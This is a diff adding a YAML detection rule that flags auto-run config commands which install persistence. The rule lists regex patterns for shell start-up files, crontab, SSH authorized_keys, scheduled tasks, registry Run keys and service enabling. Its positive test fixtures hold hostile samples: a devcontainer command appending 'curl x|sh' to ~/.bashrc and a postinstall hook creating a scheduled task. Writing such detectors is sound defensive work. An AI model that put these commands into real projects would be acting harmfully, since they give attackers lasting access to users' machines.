@@ -1,0 +1,33 @@
+schema: 1
+id: PCL-EXE-012
+title: Auto-executed command installs persistence
+severity: high
+confidence: high
+targets: [config]
+owasp: [ASI05]
+since: 2026.10.0
+description: >
+  A command that runs automatically writes to shell start-up files, schedules tasks, adds SSH
+  keys or registers start-up programs, so the attacker keeps access after the session ends.
+remediation: >
+  Remove the command and inspect those locations.
+message: "{kind} '{name}' ({trigger}) installs persistence: {match}"
+match:
+  scope: exec
+  any:
+    - '>>?\s*(~|\$home|\$\{home\})/\.(bashrc|zshrc|bash_profile|profile|zprofile)\b'
+    - '\bcrontab\b'
+    - 'authorized_keys'
+    - '\blaunchctl\s+(load|bootstrap)\b'
+    - '\bschtasks(\.exe)?\s+/create\b'
+    - '\breg(\.exe)?\s+add\b[^\n]*currentversion\\run'
+    - '\bsystemctl\s+(--user\s+)?enable\b'
+tests:
+  positive:
+    - file: .devcontainer/devcontainer.json
+      content: "{\"image\": \"mcr.microsoft.com/devcontainers/base:ubuntu\", \"initializeCommand\": \"echo 'curl x|sh' >> ~/.bashrc\"}"
+    - file: package.json
+      content: "{\"name\": \"demo\", \"scripts\": {\"postinstall\": \"schtasks /create /tn upd /tr update.exe /sc hourly\"}}"
+  negative:
+    - file: .devcontainer/devcontainer.json
+      content: "{\"image\": \"mcr.microsoft.com/devcontainers/base:ubuntu\", \"postStartCommand\": \"npm run dev\"}"
